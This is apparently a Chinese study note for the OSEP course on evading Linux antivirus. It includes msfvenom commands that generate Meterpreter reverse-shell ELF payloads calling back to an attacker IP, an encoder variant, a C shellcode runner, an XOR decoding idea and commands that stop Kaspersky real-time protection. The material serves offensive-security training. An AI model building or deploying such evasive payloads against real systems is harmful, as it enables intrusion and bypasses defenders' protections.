---
title: OSEP-11-Linux杀软绕过
description: '11-Linux后渗透 | 03-Linux杀软绕过'
pubDate: 2026-01-30T00:01:53+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
  - Linux Machine
---

# Linux 杀软绕过学习指南

本文件合并了原来的 Linux 杀软绕过和 Linux 杀软绕过详解内容。旧详解文件已归档到 `_archive\2026-05-07-深度优化`。

## 这篇文档解决什么问题

Linux 环境也可能部署杀软或 EDR。你需要理解：

```text
样本为什么被检测
检测发生在文件、内存还是行为阶段
编码、包装、编译和运行方式会如何影响检测结果
```

## Linux 杀软现状

| 特点 | 说明 |
|---|---|
| 部署率低于 Windows | 但关键服务器更可能有防护 |
| 检测对象偏服务器场景 | Webshell、恶意 ELF、挖矿、后门 |
| 产品差异大 | Kaspersky、ClamAV、Sophos、ESET 等能力不同 |
| 影响更大 | Linux 常承载 Web、数据库、DevOps、域内桥接服务 |

## 先验证杀软是否工作

EICAR 是标准测试文件，用于确认检测链是否正常。

```bash
sudo kesl-control --scan-file ./eicar.txt
sudo kesl-control -E --query | grep DetectName
```

如果 EICAR 都不检测，说明防护可能未启用、路径不对或产品不同。

## Kaspersky Endpoint Security 常用命令

```bash
kesl-control --help
sudo kesl-control --scan-file ./file.elf
sudo kesl-control -E --query | grep DetectName
sudo kesl-control --stop-t 1
sudo kesl-control --start-t 1
```

注意：停止实时保护通常需要 root，这在真实授权环境中也应谨慎记录。

## 基础检测测试

生成 Linux ELF：

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.119.120 \
  LPORT=4444 \
  -f elf -o met.elf
```

扫描：

```bash
sudo kesl-control --scan-file ./met.elf
```

你要记录：

```text
是否检测
检测名称
文件路径
样本架构
payload 类型
```

## 编码器测试

编码器改变 payload 的静态表现：

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.119.120 \
  LPORT=4444 \
  -e x64/zutto_dekiru \
  -f elf -o met_encoded.elf
```

理解重点：

```text
编码不等于加密万能
编码可能避开某些静态特征
但行为和内存阶段仍可能被检测
```

## C 语言 Shellcode 包装器

### 基本思路

把 shellcode 嵌入 C 程序，编译成新的 ELF：

```text
原始 payload -> shellcode 字节 -> C 数组 -> 编译 -> ELF
```

### 生成 C 格式 shellcode

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.119.120 \
  LPORT=1337 \
  -f c
```

### 包装器示例

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char buf[] =
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10"
"...";

int main(int argc, char **argv)
{
    int (*ret)() = (int(*)())buf;
    ret();
    return 0;
}
```

编译：

```bash
gcc -o runner.out runner.c -z execstack
```

关键点：

| 点 | 解释 |
|---|---|
| 函数指针 | 把字节数组地址当成函数入口 |
| `-z execstack` | 允许栈执行，便于简单实验 |
| 架构匹配 | x86/x64 不匹配会失败 |
| 行为检测 | 即使静态过了，运行行为仍可能暴露 |

## XOR 编码思路

XOR 是最容易理解的运行时解码方式：

```text
原始 shellcode 与 key 做 XOR -> 存储编码后的字节
运行时再 XOR 一次 -> 还原原始 shellcode
```

好处：

```text
静态文件里不再直接出现原始 shellcode 字节
```

局限：

```text
解码逻辑本身可能被检测
运行时内存仍可能暴露
行为仍可能被监控
```

## 初学者排错表

| 现象 | 可能原因 | 排查 |
|---|---|---|
| 文件扫描被检测 | 静态特征命中 | 换编码、包装、修改结构 |
| 文件不被检测但运行失败 | 架构、权限、网络、payload 配置错误 | `file`、`uname -m`、监听器、LHOST |
| 运行时报权限错误 | 文件不可执行或路径限制 | `chmod +x`、挂载选项 |
| 回连失败 | 网络出站限制 | 转到 `10-网络过滤绕过` |
| 编译失败 | 缺少 gcc 或参数错误 | 检查编译器、库、架构 |

## 学习检查清单

| 问题 | 自测 |
|---|---|
| EICAR 的作用是什么 | 验证杀软检测是否正常 |
| 编码器解决什么问题 | 改变静态特征 |
| shellcode 包装器为什么可能有效 | 改变文件结构和静态特征 |
| 为什么绕过不是永久有效 | 检测规则、行为和环境都可能变化 |
| Linux AV 绕过失败时先查什么 | 静态检测、架构、权限、网络 |
